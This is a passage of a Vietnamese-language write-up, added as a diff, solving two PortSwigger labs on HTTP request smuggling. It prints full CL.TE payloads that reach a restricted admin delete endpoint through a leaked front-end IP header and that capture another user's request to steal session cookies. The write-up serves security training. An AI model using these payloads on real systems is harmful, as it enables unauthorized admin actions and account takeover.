@@ -348,3 +348,117 @@ Lab Solved!
 
 <img width="589" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f73bbf7c-9eb2-479d-b1c3-577c9a709f14">
 
+***
+
+## 8. Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting
+
+* Content:
+```
+This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+
+There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.
+
+To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
+```
+* Exploit:
+
+Thử chức năng test kiểm tra xem có phát hiện ra trường header ẩn được front-end tự động gắn vào request gửi sang back-end hay không?
+
+<img width="478" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9a6ec521-d66f-4376-9f2a-b51225e5dff6">
+
+Sau khi phát hiện ra Header `X-XWtfcJ-Ip` => Tiến hành gửi payload đến /admin
+
+<img width="481" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/0b4a4ad8-151b-4815-9603-045c6006f09b">
+
+Okay vẫn lỗi như level trước. Tiếp tục thay đỏi payload:
+
+<img width="479" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1c7c89c9-e98c-4864-954a-1a12b63444a7">
+
+<img width="483" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4041fee5-44b5-46ae-b219-40d5374d43d5">
+
+Full payload cụ thể:
+```
+POST / HTTP/1.1
+Host: 0a8000dd030f3990807d7b38007d00b6.web-security-academy.net
+Connection: close
+sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+
+GET /admin/delete?username=carlos HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 300
+X-gnVjFm-Ip: 127.0.0.1
+
+a=b
+```
+
+***
+## 9. Lab: Exploiting HTTP request smuggling to capture other users' requests
+* Content:
+```
+This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.
+
+To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.
+```
+* Exploit:
+
+Ban đầu, gửi một post comment để xác định các trường thông tin cần thiết để thực hiện post comment => Ta xác định được cần có thông tin Cookie session và csrf token.
+
+<img width="514" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/325c6ddd-9ba4-40ef-a181-ac0e9c7fe4ef">
+
+Chuẩn bị 1 đoạn payload smuggling như sau => Các request sau của Victim sẽ bị thêm vào phía sau phần `hihi` trong nội dung Comment và được Post lên bài viết (với length tùy ý theo điều chỉnh của chúng ta, ở đây đang set là 900)
+
+<img width="477" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/067b4efe-b321-4859-b184-ccaf1f644f45">
+
+Full payload:
+```
+POST / HTTP/1.1
+Host: 0a7a00230394ed7f80e0c62a001700f0.web-security-academy.net
+Connection: close
+sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
+sec-ch-ua-mobile: ?0
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 253
+Transfer-Encoding: chunked
+
+0
+
+
+POST /post/comment HTTP/1.1
+Cookie: session=8FDVtKRmOh9Z1v3Zczw78Z473Nqko7IP
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 900
+
+csrf=FRtctewUJ38rlaPWJFSaf5mt56clwrgq&postId=9&name=testname&email=test%40test.net&comment=hihi
+```
+Sau 1 vài request, thu được nội dung như sau:
+
+<img width="368" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/891e5a8d-e799-4507-a6e8-8138bbc0831b">
+
+Sử dụng cookie trên để login vào user vicim và Resolve Lab:
+
+<img width="385" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/2ede167e-5d05-4653-8ea6-faa62ee2d46b">
